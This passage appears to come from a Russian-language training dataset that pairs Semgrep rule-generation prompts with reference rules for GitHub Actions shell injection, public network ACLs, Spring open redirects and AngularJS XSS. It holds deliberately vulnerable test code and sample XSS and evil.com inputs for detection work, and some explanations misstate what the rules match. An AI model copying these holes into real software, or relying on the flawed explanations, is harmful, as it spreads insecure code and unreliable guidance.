      "language": "python",
      "severity": "WARNING",
      "rule_type": "",
      "mode": "search",
      "is_validation": true
    }
  },
  {
    "instruction": "Сгенерируй правило Semgrep для поиска: run-shell-injection\nОписание уязвимости: Using variable interpolation `${{...}}` with `github` context data in a `run:` step could allow an attacker to inject their own code into the runner. This would allow them to steal secrets and code. `github` context data can have arbitrary user input and should be treated as untrusted. Instead, use an intermediate environment variable with `env:` to store the data and use the environment variable in the `run:` script. Be sure to use double-quotes the environment variable, like this: \"$ENVVAR\".\nCWE: CWE-78: Improper Neutralization of Special Elements used in an OS Command ('OS Command Injection')\nТип анализа: search\nЯзык: yaml",
    "input": "Требования:\n- Язык: yaml\n- Тип анализа: search\n- CWE: CWE-78: Improper Neutralization of Special Elements used in an OS Command ('OS Command Injection')\n- Серьезность: ERROR\n\nКонтекст кода:\n// File: run-shell-injection.test.yaml\n# Push Semgrep Docker Image\nname: docker\n\non:\n  workflow_dispatch:\n    inputs:\n      message_to_print:\n        type: string\n        required: false\n  push:\n    branches:\n      - develop\n  pull_request:\n    paths-ignore:\n      - \"**.md\"\n\njobs:\n  docker-build:\n    runs-on: ubuntu-latest\n    steps:\n      - uses: actions/checkout@v2\n\n      - name: Pull previous image for caching purposes\n        run: |\n          docker pull returntocorp/semgrep:develop || :\n\n      - name: Build semgrep image with default Dockerfile\n        run: docker build -t returntocorp/semgrep:develop .\n\n      - name: Check the semgrep Docker image\n        run: ./scripts/validate-docker-build.sh returntocorp/semgrep:develop\n\n      - name: Login to DockerHub\n        env:\n          DOCKERHUB_USER: ${{ secrets.DOCKER_USERNAME }}\n          DOCKERHUB_PASS: ${{ secrets.DOCKER_PASSWORD }}\n        run: ./.github/docker-login\n\n      - name: Push semgrep image if on develop branch\n        if: github.event_name == 'push' && github.ref == 'refs/heads/develop'\n        run: docker push returntocorp/semgrep:develop\n\n      - name:\n          Push commit hash if PR\n          # Don't run when PR is from a fork\n          # For security, we do not autopush to docker when from PRs\n          # said PRs do not have access to secrets so will fail anyway but\n          # nicer to not have a \"failing\" CI job in the PR so don't even\n          # try if we can detect is coming from a fork\n        if: github.event_name == 'pull_request' && github.event.pull_request.head.repo.full_name == github.repository\n        # ok: run-shell-injection\n        run: |\n          tag=returntocorp/semgrep:${{ github.sha }}\n          docker build -t \"$tag\" .\n          docker push \"$tag\"\n\n        # Extend the semgrep image, changing the entry point to bash and\n        # adding some utilities. This image is meant for internal uses\n        # such as benchmarks.\n      - name: Build and push semgrep-dev image if on   # Ограничиваем длину\n\nОпасные паттерны:\n• run: |\n  echo '${{ github.event.pull_request.title }}'\n• run: |\n  curl -L '${{ github.event.url }}'\n• run: |\n  git clone '${{ github.event.repository.clone_url }}'\n\nБезопасные паттерны:  \n• env:\n  REPOSITORY_URL: '${{ github.event.repository.clone_url }}'\n...\nrun: |\n  git clone '$REPOSITORY_URL'\n• env:\n  ISSUE_TITLE: '${{ github.event.issue.title }}'\n...\nrun: |\n  echo '$ISSUE_TITLE'\n• env:\n  EVENT_URL: '${{ github.event.url }}'\n...\nrun: |\n  curl -L '$EVENT_URL'\n\nЛегенда аннотаций:\n- // ruleid:run-shell-injection: Метка для кода, который ДОЛЖЕН срабатывать на правило (опасный пример)\n- // ok:run-shell-injection: Метка для кода, который НЕ должен срабатывать на правило (безопасный пример)",
    "output": "rules:\n- id: run-shell-injection\n  languages:\n  - yaml\n  message: 'Using variable interpolation `${{...}}` with `github` context data in a `run:` step could\n    allow an attacker to inject their own code into the runner. This would allow them to steal secrets\n    and code. `github` context data can have arbitrary user input and should be treated as untrusted.\n    Instead, use an intermediate environment variable with `env:` to store the data and use the environment\n    variable in the `run:` script. Be sure to use double-quotes the environment variable, like this: \"$ENVVAR\".'\n  metadata:\n    category: security\n    cwe:\n    - \"CWE-78: Improper Neutralization of Special Elements used in an OS Command ('OS Command Injection')\"\n    owasp:\n    - A01:2017 - Injection\n    - A03:2021 - Injection\n    references:\n    - https://docs.github.com/en/actions/learn-github-actions/security-hardening-for-github-actions#understanding-the-risk-of-script-injections\n    - https://securitylab.github.com/research/github-actions-untrusted-input/\n    technology:\n    - github-actions\n    cwe2022-top25: true\n    cwe2021-top25: true\n    subcategory:\n    - vuln\n    likelihood: HIGH\n    impact: HIGH\n    confidence: HIGH\n  patterns:\n  - pattern-inside: 'steps: [...]'\n  - pattern-inside: |\n      - run: ...\n        ...\n  - pattern: 'run: $SHELL'\n  - metavariable-pattern:\n      language: generic\n      metavariable: $SHELL\n      patterns:\n      - pattern-either:\n        - pattern: ${{ github.event.issue.title }}\n        - pattern: ${{ github.event.issue.body }}\n        - pattern: ${{ github.event.pull_request.title }}\n        - pattern: ${{ github.event.pull_request.body }}\n        - pattern: ${{ github.event.comment.body }}\n        - pattern: ${{ github.event.review.body }}\n        - pattern: ${{ github.event.review_comment.body }}\n        - pattern: ${{ github.event.pages. ... .page_name}}\n        - pattern: ${{ github.event.head_commit.message }}\n        - pattern: ${{ github.event.head_commit.author.email }}\n        - pattern: ${{ github.event.head_commit.author.name }}\n        - pattern: ${{ github.event.commits ... .author.email }}\n        - pattern: ${{ github.event.commits ... .author.name }}\n        - pattern: ${{ github.event.pull_request.head.ref }}\n        - pattern: ${{ github.event.pull_request.head.label }}\n        - pattern: ${{ github.event.pull_request.head.repo.default_branch }}\n        - pattern: ${{ github.head_ref }}\n        - pattern: ${{ github.event.inputs ... }}\n        - pattern: ${{ github.event.discussion.title }}\n        - pattern: ${{ github.event.discussion.body }}\n        - pattern: ${{ inputs ... }}\n  severity: ERROR\n\n\n# Логика правила:\nЭто правило Semgrep предназначено для поиска использования переменных-интерполяций (`${{...}}`) с данными контекста `github`, которые могут быть использованы в шаге `run`. Такие интерполяции представляют собой потенциальную угрозу инъекций команд оболочки, так как данные контекста `github` могут содержать произвольный ввод пользователя и должны рассматриваться как недоверенные. Правило ищет конкретные шаблоны, где такие интерполяции используются непосредственно в команде `run`, и рекомендует использовать промежуточную переменную окружения вместо прямого доступа к данным контекста.\n\n# Ключевые элементы:\n- ID: run-shell-injection\n- Язык: yaml \n- Тип: vuln\n- Серьезность: ERROR",
    "metadata": {
      "rule_id": "run-shell-injection",
      "language": "yaml",
      "severity": "ERROR",
      "rule_type": "vuln",
      "mode": "search",
      "is_validation": true
    }
  },
  {
    "instruction": "Создай Semgrep правило для: aws-network-acl-allows-public-ingress\nОписание уязвимости: The network ACL rule allows ingress from public internet. Opening up ACLs to the public internet is potentially dangerous. You should restrict access to IP addresses or ranges that explicitly require it where possible. Set a more restrictive CIDR range.\nCWE: CWE-1220: Insufficient Granularity of Access Control\nТип анализа: search\nЯзык: hcl",
    "input": "Требования:\n- Язык: hcl\n- Тип анализа: search\n- CWE: CWE-1220: Insufficient Granularity of Access Control\n- Серьезность: WARNING\n\nКонтекст кода:\n// File: aws-network-acl-allows-public-ingress.tf\n# ruleid: aws-network-acl-allows-public-ingress\nresource \"aws_network_acl_rule\" \"fail_open_1\" {\n  network_acl_id = aws_network_acl.example.id\n  rule_number    = 1\n  egress         = false\n  protocol       = \"tcp\"\n  from_port      = 22\n  to_port        = 22\n  rule_action    = \"allow\"\n  cidr_block     = \"0.0.0.0/0\"\n}\n\nresource \"aws_network_acl\" \"fail_open_1\" {\n  vpc_id = aws_vpc.example.id\n\n  # ruleid: aws-network-acl-allows-public-ingress\n  ingress {\n    rule_no    = 1\n    protocol   = \"tcp\"\n    from_port  = 22\n    to_port    = 22\n    action     = \"allow\"\n    cidr_block = \"0.0.0.0/0\"\n  }\n}\n\nresource \"aws_default_network_acl\" \"fail_open_1\" {\n  default_network_acl_id = aws_vpc.example.default_network_acl_id\n\n  # ruleid: aws-network-acl-allows-public-ingress\n  ingress {\n    rule_no    = 1\n    protocol   = \"tcp\"\n    from_port  = 22\n    to_port    = 22\n    action     = \"allow\"\n    cidr_block = \"0.0.0.0/0\"\n  }\n}\n\n# ruleid: aws-network-acl-allows-public-ingress\nresource \"aws_network_acl_rule\" \"fail_open_2\" {\n  network_acl_id = aws_network_acl.example.id\n  rule_number    = 1\n  egress         = false\n  protocol       = \"tcp\"\n  from_port      = 22\n  to_port        = 22\n  rule_action    = \"allow\"\n  cidr_block     = \"127.0.0.0/0\"\n}\n\nresource \"aws_network_acl\" \"fail_open_2\" {\n  vpc_id = aws_vpc.example.id\n\n  # ruleid: aws-network-acl-allows-public-ingress\n  ingress {\n    rule_no    = 1\n    protocol   = \"tcp\"\n    from_port  = 22\n    to_port    = 22\n    action     = \"allow\"\n    cidr_block = \"127.0.0.0/0\"\n  }\n}\n\n# ruleid: aws-network-acl-allows-public-ingress\nresource \"aws_network_acl_rule\" \"fail_start_outside_loopback_1\" {\n  network_acl_id = aws_network_acl.example.id\n  rule_number    = 1\n  egress         = false\n  protocol       = \"tcp\"\n  from_port      = 22\n  to_port        = 22\n  rule_action    = \"allow\"\n  cidr_block     = \"127.0.0.0/2\" # 64.0.0.0 - 127.255.255.255\n}\n\nresource \"aws_network_acl\" \"fail_start_outside_loopback_1\" {\n   # Ограничиваем длину\n\nОпасные паттерны:\n• resource \"aws_network_acl_rule\" fail_open_1 { ... cidr_block = \"0.0.0.0/0\" }\n• resource \"aws_network_acl\" fail_open_1 { ... ingress { ... cidr_block = \"0.0.0.0/0\" } }\n• resource \"aws_default_network_acl\" fail_open_1 { ... ingress { ... cidr_block = \"0.0.0.0/0\" } }\n\nБезопасные паттерны:  \n• resource \"aws_network_acl_rule\" pass_inside_loopback_1 { ... cidr_block = \"127.0.0.0/8\" }\n• resource \"aws_network_acl\" pass_inside_loopback_1 { ... ingress { ... cidr_block = \"127.0.0.0/8\" } }\n• resource \"aws_default_network_acl\" pass_inside_loopback_1 { ... ingress { ... cidr_block = \"127.0.0.0/8\" } }\n\nЛегенда аннотаций:\n- // ruleid:aws-network-acl-allows-public-ingress: Метка для кода, который ДОЛЖЕН срабатывать на правило (опасный пример)\n- // ok:aws-network-acl-allows-public-ingress: Метка для кода, который НЕ должен срабатывать на правило (безопасный пример)",
    "output": "rules:\n- id: aws-network-acl-allows-public-ingress\n  patterns:\n  - pattern-either:\n    - patterns:\n      - pattern: |\n          resource \"aws_network_acl_rule\" $ANYTHING {\n            ...\n            rule_action = \"allow\"\n            cidr_block = \"$PUBLIC_IPV4_CIDR\"\n            ...\n          }\n      - pattern-not: |\n          resource \"aws_network_acl_rule\" $ANYTHING {\n            ...\n            egress = true\n            ...\n          }\n    - patterns:\n      - pattern-inside: |\n          resource \"$NETWORK_ACL\" $ANYTHING {\n            ...\n          }\n      - pattern: |\n          ingress {\n            ...\n            action = \"allow\"\n            cidr_block = \"$PUBLIC_IPV4_CIDR\"\n            ...\n          }\n      - metavariable-regex:\n          metavariable: $NETWORK_ACL\n          regex: ^(aws_network_acl|aws_default_network_acl)$\n  - metavariable-pattern:\n      metavariable: $PUBLIC_IPV4_CIDR\n      language: generic\n      # Exclude any CIDR range that starts and ends in the designated private ranges:\n      # - 127.0.0.0/8 (IPv4 loopback) i.e. 127.0.0.0 - 127.255.255.255\n      # - 10.0.0.0/8 (IPv4 private network) i.e. 10.0.0.0 - 10.255.255.255\n      # - 172.16.0.0/12 (IPv4 private network) i.e. 172.16.0.0 - 172.31.255.255\n      # - 192.168.0.0/16 (IPv4 private network) i.e. 192.168.0.0 - 192.168.255.255\n      # - 169.254.0.0/16 (IPv4 link-local) i.e. 169.254.0.0 - 169.254.255.255\n      # - 100.64.0.0/10 (IPv4 shared address space) i.e. 100.64.0.0 - 100.127.255.255\n      patterns:\n      # 127.0.0.0 with netmask 8-32\n      - pattern-not-regex: ^127\\.\\d{1,3}\\.\\d{1,3}\\.\\d{1,3}/(8|9|[1-3][0-9])$\n      # 10.0.0.0 with netmask 8-32\n      - pattern-not-regex: ^10\\.\\d{1,3}\\.\\d{1,3}\\.\\d{1,3}/(8|9|[1-3][0-9])$\n      # 172.16.0.0-172.31.0.0 with netmask 12-32\n      - pattern-not-regex: ^172\\.(1[6-9]|2[0-9]|3[01])\\.\\d{1,3}\\.\\d{1,3}/(1[2-9]|[23][0-9])$\n      # 192.168.0.0 with netmask 16-32\n      - pattern-not-regex: ^192\\.168\\.\\d{1,3}\\.\\d{1,3}/(1[6-9]|[23][0-9])$\n      # 169.254.0.0 with netmask 16-32\n      - pattern-not-regex: ^169\\.254\\.\\d{1,3}\\.\\d{1,3}/(1[6-9]|[23][0-9])$\n      # 100.64.0.0-100.127.0.0 with netmask 10-32\n      - pattern-not-regex: ^100\\.(6[4-9]|[7-9][0-9]|1[01][0-9]|12[0-7])\\.\\d{1,3}\\.\\d{1,3}/[1-3][0-9]$\n      # *Also* exclude any CIDR range containing only 1 IP address, even if it is public\n      - pattern-not-regex: ^\\d{1,3}\\.\\d{1,3}\\.\\d{1,3}\\.\\d{1,3}/32$\n  message: >-\n    The network ACL rule allows ingress from public internet. Opening up ACLs\n    to the public internet is potentially dangerous. You should restrict access to\n    IP addresses or ranges that explicitly require it where possible. Set a more restrictive\n    CIDR range.\n  languages:\n  - hcl\n  severity: WARNING\n  metadata:\n    category: security\n    technology:\n    - terraform\n    - aws\n    owasp:\n    - A01:2021 - Broken Access Control\n    cwe:\n    - 'CWE-1220: Insufficient Granularity of Access Control'\n    references:\n    - https://owasp.org/Top10/A01_2021-Broken_Access_Control/\n    - https://registry.terraform.io/providers/hashicorp/aws/latest/docs/resources/network_acl\n    - https://registry.terraform.io/providers/hashicorp/aws/latest/docs/resources/network_acl_rule#cidr_block\n    - https://registry.terraform.io/providers/hashicorp/aws/latest/docs/resources/default_network_acl#cidr_block\n    - https://docs.aws.amazon.com/vpc/latest/userguide/vpc-network-acls.html\n    subcategory:\n    - audit\n    likelihood: MEDIUM\n    impact: MEDIUM\n    confidence: LOW\n\n\n# Логика правила:\nЭто правило Semgrep предназначено для поиска ресурсов AWS Network ACL Rule или Default Network ACL, которые разрешают входящий трафик (ingress) от общедоступных IP-адресов (например, диапазоны 0.0.0.0/0, 100.64.0.0/10, 169.254.0.0/16). Правило использует комбинацию шаблонов, включая проверку атрибутов ресурса, таких как `rule_action`, `cidr_block` и наличие ключевого слова `ingress`. Шаблон также учитывает исключения для частных сетей и специальных диапазонов адресов, таких как IPv4 loopback, частные сети и локальные сетевые адреса. Если обнаруживается ресурс, который разрешает доступ от общедоступных IP-адресов, выдается предупреждение о потенциальной угрозе безопасности.\n\n# Ключевые элементы:\n- ID: aws-network-acl-allows-public-ingress\n- Язык: hcl \n- Тип: audit\n- Серьезность: WARNING",
    "metadata": {
      "rule_id": "aws-network-acl-allows-public-ingress",
      "language": "hcl",
      "severity": "WARNING",
      "rule_type": "audit",
      "mode": "search",
      "is_validation": true
    }
  },
  {
    "instruction": "Создай правило Semgrep для обнаружения detect-generic-ai-anthprop\nОписание уязвимости: Possibly found usage of AI: Anthropic\nCWE: \nТип анализа: search\nЯзык: generic",
    "input": "Требования:\n- Язык: generic\n- Тип анализа: search\n- CWE: \n- Серьезность: INFO\n\nКонтекст кода:\n// File: detect-generic-ai-anthprop.txt\n# ruleid: detect-generic-ai-anthprop\nimport anthropic\n\n# ruleid: detect-generic-ai-anthprop\nclient = anthropic.Anthropic(\n    # defaults to os.environ.get(\"ANTHROPIC_API_KEY\")\n    api_key=\"my_api_key\",\n)\n\nmessage = client.messages.create(\n\t# ruleid: detect-generic-ai-anthprop\n    model=\"claude-3-opus-20240229\",\n    max_tokens=1024,\n    messages=[\n        {\"role\": \"user\", \"content\": \"Hello, Claude\"}\n    ]\n)\nprint(message.content)  # Ограничиваем длину\n\nОпасные паттерны:\n• import anthropic\n...\nclient = anthropic.Anthropic(...)\n• from Anthropic import Anthropic\n...\nmodel = Anthropic(...)\n• model = claude-3-opus-20240229\n\nБезопасные паттерны:  \n• import some_library\n...\nsome_function()\n• class MyClass:\n   def method(self):\n       pass\n• model = gpt-4\n\nЛегенда аннотаций:\n- // ruleid:detect-generic-ai-anthprop: Метка для кода, который ДОЛЖЕН срабатывать на правило (опасный пример)\n- // ok:detect-generic-ai-anthprop: Метка для кода, который НЕ должен срабатывать на правило (безопасный пример)",
    "output": "rules:\n  - id: detect-generic-ai-anthprop\n    languages:\n      - generic\n    severity: INFO\n    message: \"Possibly found usage of AI: Anthropic\"\n    pattern-either:\n      - pattern: anthropic\n      - pattern: Anthropic\n      - pattern: claude\n    metadata:\n      references:\n        - https://semgrep.dev/blog/2024/detecting-shadow-ai\n      category: maintainability\n      technology:\n        - genAI\n        - LLMs\n      confidence: LOW\n\n# Логика правила:\nЭто правило Semgrep предназначено для поиска возможных упоминаний библиотеки или модели искусственного интеллекта от компании Anthropic. Анализ выполняется методом поиска строк 'anthropic', 'Anthropic' и 'claude'. Правило использует оператор 'pattern-either' для объединения нескольких шаблонов в одно условие совпадения. Если любой из указанных идентификаторов встречается в коде, правило отмечает его как потенциально опасный фрагмент.\n\n# Ключевые элементы:\n- ID: detect-generic-ai-anthprop\n- Язык: generic \n- Тип: \n- Серьезность: INFO",
    "metadata": {
      "rule_id": "detect-generic-ai-anthprop",
      "language": "generic",
      "severity": "INFO",
      "rule_type": "",
      "mode": "search",
      "is_validation": true
    }
  },
  {
    "instruction": "Разработай правило Semgrep для выявления: azure-appservice-used-azure-files\nОписание уязвимости: Ensure that app services use Azure Files\nCWE: \nТип анализа: search\nЯзык: hcl",
    "input": "Требования:\n- Язык: hcl\n- Тип анализа: search\n- CWE: \n- Серьезность: INFO\n\nКонтекст кода:\n// File: azure-appservice-used-azure-files.tf\n# fail\n# ruleid: azure-appservice-used-azure-files\nresource \"azurerm_app_service\" \"example\" {\n  name                = \"example-app-service\"\n  location            = azurerm_resource_group.example.location\n  resource_group_name = azurerm_resource_group.example.name\n  app_service_plan_id = azurerm_app_service_plan.example.id\n  https_only          = true\n  storage_account {\n    name = \"test_name\"\n    type = \"AzureBlob\"\n    account_name =\"test_account_name\"\n    share_name = \"test_share_name\"\n    access_key = \"test_access_key\"\n  }\n}\n\n# fail\n# ruleid: azure-appservice-used-azure-files\nresource \"azurerm_app_service\" \"example\" {\n  name                = \"example-app-service\"\n  location            = azurerm_resource_group.example.location\n  resource_group_name = azurerm_resource_group.example.name\n  app_service_plan_id = azurerm_app_service_plan.example.id\n  https_only          = true\n  site_config {\n    scm_type                 = \"someValue\"\n  }\n}\n\n# pass\nresource \"azurerm_app_service\" \"example\" {\n    name                = \"example-app-service\"\n  location            = azurerm_resource_group.example.location\n  resource_group_name = azurerm_resource_group.example.name\n  app_service_plan_id = azurerm_app_service_plan.example.id\n  https_only          = true\n  storage_account {\n    name = \"test_name\"\n    type = \"AzureFiles\"\n    account_name =\"test_account_name\"\n    share_name = \"test_share_name\"\n    access_key = \"test_access_key\"\n  }\n}  # Ограничиваем длину\n\nОпасные паттерны:\n• resource \"azurerm_app_service\" \"example\" { ... storage_account { ... type = \"AzureBlob\" ... } ... }\n• resource \"azurerm_app_service\" \"example\" { ... site_config { ... scm_type = \"someValue\" ... } ... }\n\nБезопасные паттерны:  \n• resource \"azurerm_app_service\" \"example\" { ... storage_account { ... type = \"AzureFiles\" ... } ... }\n\nЛегенда аннотаций:\n- // ruleid:azure-appservice-used-azure-files: Метка для кода, который ДОЛЖЕН срабатывать на правило (опасный пример)\n- // ok:azure-appservice-used-azure-files: Метка для кода, который НЕ должен срабатывать на правило (безопасный пример)",
    "output": "rules:\n  - id: azure-appservice-used-azure-files\n    message: >-\n      Ensure that app services use Azure Files\n    patterns:\n      - pattern: resource\n      - pattern-not-inside: |\n          resource \"azurerm_app_service\" \"...\" {\n          ...\n          storage_account {\n            ...\n            type = \"AzureFiles\"\n            ...\n          }\n          ...\n          }\n      - pattern-inside: |\n          resource \"azurerm_app_service\" \"...\" {\n          ...\n          }\n    metadata:\n      category: best-practice\n      technology:\n        - terraform\n        - azure\n    languages: [hcl]\n    severity: INFO\n\n\n# Логика правила:\nЭто правило Semgrep предназначено для поиска ресурсов типа 'azurerm_app_service' в конфигурационном файле Terraform (.tf) на языке HCL. Правило проверяет наличие блока 'storage_account' внутри ресурса 'azurerm_app_service', где тип хранилища не равен 'AzureFiles'. Это означает, что если ресурс использует другой тип хранилища вместо 'AzureFiles', то он считается небезопасным. Безопасный пример включает явное указание типа хранилища 'AzureFiles' в блоке 'storage_account'.\n\n# Ключевые элементы:\n- ID: azure-appservice-used-azure-files\n- Язык: hcl \n- Тип: \n- Серьезность: INFO",
    "metadata": {
      "rule_id": "azure-appservice-used-azure-files",
      "language": "hcl",
      "severity": "INFO",
      "rule_type": "",
      "mode": "search",
      "is_validation": true
    }
  },
  {
    "instruction": "Создай Semgrep правило для: spring-unvalidated-redirect\nОписание уязвимости: Application redirects a user to a destination URL specified by a user supplied parameter that is not validated.\nCWE: CWE-601: URL Redirection to Untrusted Site ('Open Redirect')\nТип анализа: search\nЯзык: java",
    "input": "Требования:\n- Язык: java\n- Тип анализа: search\n- CWE: CWE-601: URL Redirection to Untrusted Site ('Open Redirect')\n- Серьезность: WARNING\n\nКонтекст кода:\n// File: spring-unvalidated-redirect.java\npackage testcode.spring;\n\nimport org.springframework.stereotype.Controller;\nimport org.springframework.web.bind.annotation.RequestMapping;\nimport org.springframework.web.bind.annotation.RequestParam;\nimport org.springframework.web.servlet.ModelAndView;\n\n@Controller\npublic class SpringUnvalidatedRedirectController {\n\n    // ruleid: spring-unvalidated-redirect\n    @RequestMapping(\"/redirect1\")\n    public String redirect1(@RequestParam(\"url\") String url) {\n        return \"redirect:\" + url;\n    }\n\n    // ruleid: spring-unvalidated-redirect\n    @RequestMapping(\"/redirect2\")\n    public String redirect2(@RequestParam(\"url\") String url) {\n        String view = \"redirect:\" + url;\n        return view;\n    }\n\n    @RequestMapping(\"/redirect3\")\n    public String redirect3(@RequestParam(\"url\") String url) {\n        return buildRedirect(url);\n    }\n\n    // ruleid: spring-unvalidated-redirect\n    private String buildRedirect(String u) {\n        return \"redirect:\" + u;\n    }\n\n    // ruleid: spring-unvalidated-redirect\n    @RequestMapping(\"/redirect4\")\n    public ModelAndView redirect4(@RequestParam(\"url\") String url) {\n        return new ModelAndView(\"redirect:\" + url);\n    }\n\n    // ruleid: spring-unvalidated-redirect\n    @RequestMapping(\"/redirect5\")\n    public ModelAndView redirect5(@RequestParam(\"url\") String url) {\n        String view = \"redirect:\" + url;\n        return new ModelAndView(view);\n    }\n\n    // ok: spring-unvalidated-redirect\n    @RequestMapping(\"/redirectfp\")\n    public String redirectfp() {\n        return \"redirect:/\";\n    }\n}  # Ограничиваем длину\n\nОпасные паттерны:\n• ruleid: spring-unvalidated-redirect\\n@RequestMapping(\\\n• )\\npublic String redirect1(@RequestParam(\\\n• ) String url) {\\n    return \\\n\nБезопасные паттерны:  \n• @RequestMapping(\\\n• )\\npublic String redirectfp() {\\n    return \\\n• ;\\n}\n\nЛегенда аннотаций:\n- // ruleid:spring-unvalidated-redirect: Метка для кода, который ДОЛЖЕН срабатывать на правило (опасный пример)\n- // ok:spring-unvalidated-redirect: Метка для кода, который НЕ должен срабатывать на правило (безопасный пример)",
    "output": "rules:\n- id: spring-unvalidated-redirect\n  message: >-\n    Application redirects a user to a destination URL specified by a user supplied parameter that is not\n    validated.\n  metadata:\n    cwe:\n    - \"CWE-601: URL Redirection to Untrusted Site ('Open Redirect')\"\n    owasp:\n    - A01:2021 - Broken Access Control\n    source-rule-url: https://find-sec-bugs.github.io/bugs.htm#UNVALIDATED_REDIRECT\n    category: security\n    technology:\n    - spring\n    references:\n    - https://owasp.org/Top10/A01_2021-Broken_Access_Control\n    subcategory:\n    - vuln\n    likelihood: MEDIUM\n    impact: MEDIUM\n    confidence: MEDIUM\n  severity: WARNING\n  languages: [java]\n  pattern-either:\n  - pattern: |\n      $X $METHOD(...,String $URL,...) {\n        return \"redirect:\" + $URL;\n      }\n  - pattern: |\n      $X $METHOD(...,String $URL,...) {\n        ...\n        String $REDIR = \"redirect:\" + $URL;\n        ...\n        return $REDIR;\n        ...\n      }\n  - pattern: |\n      $X $METHOD(...,String $URL,...) {\n        ...\n        new ModelAndView(\"redirect:\" + $URL);\n        ...\n      }\n  - pattern: |-\n      $X $METHOD(...,String $URL,...) {\n        ...\n        String $REDIR = \"redirect:\" + $URL;\n        ...\n        new ModelAndView($REDIR);\n        ...\n      }\n\n\n# Логика правила:\nЭто правило Semgrep предназначено для поиска потенциальных уязвимостей Open Redirect в приложениях Spring. Оно ищет методы, принимающие параметр URL от пользователя и возвращающие перенаправление на этот URL без предварительной проверки или фильтрации. Правило использует шаблон метода с параметром типа String, который используется для формирования строки перенаправления. Шаблон также учитывает случаи, когда строка перенаправления создается внутри переменной перед возвратом.\n\n# Ключевые элементы:\n- ID: spring-unvalidated-redirect\n- Язык: java \n- Тип: vuln\n- Серьезность: WARNING",
    "metadata": {
      "rule_id": "spring-unvalidated-redirect",
      "language": "java",
      "severity": "WARNING",
      "rule_type": "vuln",
      "mode": "search",
      "is_validation": true
    }
  },
  {
    "instruction": "Напиши Semgrep правило для обнаружения: detect-angular-trust-as-method\nОписание уязвимости: The use of $sce.trustAs can be dangerous if unsanitized user input flows through this API.\nCWE: CWE-79: Improper Neutralization of Input During Web Page Generation ('Cross-site Scripting')\nТип анализа: taint\nЯзык: javascript\nИсточники (sources): определены в правиле\nСинки (sinks): определены в правиле",
    "input": "Требования:\n- Язык: javascript\n- Тип анализа: taint\n- CWE: CWE-79: Improper Neutralization of Input During Web Page Generation ('Cross-site Scripting')\n- Серьезность: WARNING\n\nКонтекст кода:\n// File: detect-angular-trust-as-method.js\nvar app = angular.module('MyApp', []);\napp.controller('myCtrl', function($scope, $sce) {\n    $scope.userInput = 'foo';\n\n    $scope.sayHello = function() {\n\n     value = $scope.html\n     // ruleid:detect-angular-trust-as-method\n     $sce.trustAs($sce.HTML, value);\n     // ruleid:detect-angular-trust-as-method\n     $sce.trustAs($sce.CSS, value);\n     // ruleid:detect-angular-trust-as-method\n     $sce.trustAs($sce.JS, value);\n     // ruleid:detect-angular-trust-as-method\n     $sce.trustAs($sce.RESOURCE_URL, value);\n     // ruleid:detect-angular-trust-as-method\n     $sce.trustAs($sce.URL, value);\n\n\n     //Data is not coming from user input\n     $scope.trustedurl = $sce.trustAs('stringLiteral');\n   };\n\n});  # Ограничиваем длину\n\nОпасные паттерны:\n• var app = angular.module('MyApp', []); app.controller('myCtrl', function($scope, $sce) { $scope.userInput = 'foo'; $scope.sayHello = function() { value = $scope.userInput; $sce.trustAs($sce.HTML, valu\n• var app = angular.module('MyApp', []); app.controller('myCtrl', function($scope, $sce) { $scope.userInput = '<script>alert(1)</script>'; $scope.sayHello = function() { value = $scope.userInput; $sce.t\n• var app = angular.module('MyApp', []); app.controller('myCtrl', function($scope, $sce) { $scope.userInput = 'http://evil.com'; $scope.sayHello = function() { value = $scope.userInput; $sce.trustAs($sc\n\nБезопасные паттерны:  \n• var app = angular.module('MyApp', []); app.controller('myCtrl', function($scope, $sce) { $scope.trustedurl = $sce.trustAs('stringLiteral'); });\n• var app = angular.module('MyApp', []); app.controller('myCtrl', function($scope, $sce) { $scope.userInput = 'foo'; $scope.sayHello = function() { value = $scope.userInput; $sce.trustAs($sce.RESOURCE_U\n• var app = angular.module('MyApp', []); app.controller('myCtrl', function($scope, $sce) { $scope.userInput = 'foo'; $scope.sayHello = function() { value = $scope.userInput; $sce.trustAs($sce.JS, 'safej\n\nЛегенда аннотаций:\n- // ruleid:detect-angular-trust-as-method: Метка для кода, который ДОЛЖЕН срабатывать на правило (опасный пример)\n- // ok:detect-angular-trust-as-method: Метка для кода, который НЕ должен срабатывать на правило (безопасный пример)",
    "output": "rules:\n- id: detect-angular-trust-as-method\n  message: >-\n    The use of $sce.trustAs can be dangerous if unsanitized user input flows through this API.\n  metadata:\n    references:\n    - https://docs.angularjs.org/api/ng/service/$sce\n    - https://owasp.org/www-chapter-london/assets/slides/OWASPLondon20170727_AngularJS.pdf\n    category: security\n    cwe:\n    - \"CWE-79: Improper Neutralization of Input During Web Page Generation ('Cross-site Scripting')\"\n    technology:\n    - angular\n    owasp:\n    - A07:2017 - Cross-Site Scripting (XSS)\n    - A03:2021 - Injection\n    cwe2022-top25: true\n    cwe2021-top25: true\n    subcategory:\n    - vuln\n    likelihood: LOW\n    impact: MEDIUM\n    confidence: MEDIUM\n  languages:\n  - javascript\n  - typescript\n  severity: WARNING\n  mode: taint\n  pattern-sources:\n  - patterns:\n    - pattern-inside: |\n        app.controller(..., function($scope,$sce) {\n        ...\n        });\n    - pattern: $scope.$X\n  pattern-sinks:\n  - pattern: $sce.trustAs(...)\n  - pattern: $sce.trustAsHtml(...)\n\n\n# Логика правила:\nЭто правило Semgrep предназначено для поиска использования метода $sce.trustAs в AngularJS, который может быть опасным, если несанционированный пользовательский ввод передается через этот API. Источники (sources) определяются внутри шаблона controller AngularJS и включают переменную $scope, обозначаемую метапеременной $X. Синки (sinks) представляют собой вызовы методов $sce.trustAs и $sce.trustAsHtml, которые потенциально могут привести к XSS-уязвимостям при передаче несанционированных данных.\n\n# Ключевые элементы:\n- ID: detect-angular-trust-as-method\n- Язык: javascript \n- Тип: vuln\n- Серьезность: WARNING",
    "metadata": {
      "rule_id": "detect-angular-trust-as-method",
      "language": "javascript",
      "severity": "WARNING",
      "rule_type": "vuln",
      "mode": "taint",
      "is_validation": true
    }
  },
  {
    "instruction": "Создай Semgrep правило для: aws-fsx-windows-encrypted-with-cmk\nОписание уязвимости: Ensure FSX Windows file system is encrypted at rest using KMS CMKs. CMKs gives you control over the encryption key in terms of access and rotation.\nCWE: CWE-320: CWE CATEGORY: Key Management Errors\nТип анализа: search\nЯзык: hcl",
